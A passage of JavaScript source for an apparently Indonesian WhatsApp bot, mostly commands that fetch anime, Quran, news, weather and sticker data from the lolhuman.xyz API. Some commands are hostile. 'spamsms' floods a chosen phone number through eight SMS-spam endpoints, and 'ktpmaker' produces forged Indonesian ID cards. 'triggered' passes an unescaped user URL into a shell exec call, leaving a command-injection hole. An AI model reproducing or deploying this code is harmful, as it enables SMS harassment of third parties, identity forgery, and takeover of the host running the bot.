                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'otakudesu':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesu?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'otakudesusearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
           case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Thexal : ${get_result.thexal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
                 // Islami //
                case 'listsurah':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolkey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolkey}`)
                    await hexa.sendMessage(from, ini_buffer, audio, { quoted: flokasi, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
case 'infofilm':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    break
        case 'shopee':
                    if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'ssweb':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${ini_link}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftroli })
                    break
                case 'ssweb2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/sswebfull?apikey=${lolkey}&url=${ini_link}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftroli })
                    break
                case 'shortlink':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${lolkey}&url=${ini_link}`)
                    reply(ini_buffer.result)
                    break
                case 'spamsms':
                 if (mek.key.fromMe)return reply ('owner only!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${nomor}`)
                    reply("Success")
                    break
                case 'stalktwitter':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jokowi`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${username}?apikey=${lolkey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.profile_picture)
                    ini_txt = `Username : ${ini_result.screen_name}\n`
                    ini_txt += `Name : ${ini_result.name}\n`
                    ini_txt += `Tweet : ${ini_result.tweet}\n`
                    ini_txt += `Joined : ${ini_result.joined}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Like : ${ini_result.like}\n`
                    ini_txt += `Description : ${ini_result.description}`
                    hexa.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'faketoko':
                    await faketoko(teks = "Tahu Bacem", url_image = "https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg", title = "LoL Human", code = "IDR", price = 1000000)
                    break
                case 'ktpmaker':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${lolkey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftroli })
                    break
                case 'triggered':
                    ini_url = args[0]
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/editor/triggered?apikey=${lolkey}&img=${ini_url}`
                    exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        hexa.sendMessage(from, buff, sticker, { quoted: ftroli }).then(() => {
                            fs.unlinkSync(rano)
                        })
                    })
                    break
                case 'wasted':
                    ini_url = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/editor/wasted?apikey=${lolkey}&img=${ini_url}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftroli })
                    break
                case 'smoji':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolkey}`)
                    await hexa.sendMessage(from, ini_buffer, sticker, { quoted: ftroli })
                    break
                case 'smoji2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/smoji3/${emoji}?apikey=${lolkey}`)
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=` + ini_buffer.result.emoji.whatsapp)
                    await hexa.sendMessage(from, ini_buffer, sticker, { quoted: ftroli })
                    break
              case 'asupan':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await hexa.sendMessage(from, ini_buffer, video, { quoted: ftroli, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
                case 'wancak':
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftroli })
                    break
                case 'google':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'stickerwa':
                 case 'searchsticker':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
                        await hexa.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                case 'playstore':
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'newsinfo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnindonesia':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnnasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnninternasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'infogempa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_buffer = await getBuffer(get_result.map)
                    await hexa.sendMessage(from, get_buffer, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'lirik':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${lolkey}&query=${query}`)
                    reply(get_result.result)
                    break
                case 'cuaca':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    await hexa.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: ftroli })
                    reply(ini_txt)
                    break
                case 'covidindo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'covidglobal':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
    case 'penetral':
     case 'v':

      p = ` .
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      .
      
      
      
      
      
      
      
      
      
.













.























.






















.

















.
















.

















Ini penetral virtex brok`
				 for (let i = 0; i < 5; i++) { 
				 }
     hexa.sendMessage(from, p, text, {quoted:ftoko})
break
                case 'telesticker':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        await hexa.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                case 'pinterest':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko })
                    break
                case 'pinterest2':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/pinterest2?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await hexa.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'pinterestdl':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id.pinterest.com/pin/696580267364426905/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result[0]
                    ini_buffer = await getBuffer(ini_url)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko })
                    break
                case 'pixiv':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixiv?apikey=${lolkey}&query=${query}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko })
                    break
                case 'pixivdl':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} 63456028`)
                    query = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${lolkey}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko })
                    break
                case 'kbbi':
                 reply('Loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${lolkey}&query=${args.join(" ")}`)
                    lila = get_result.result
                    ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
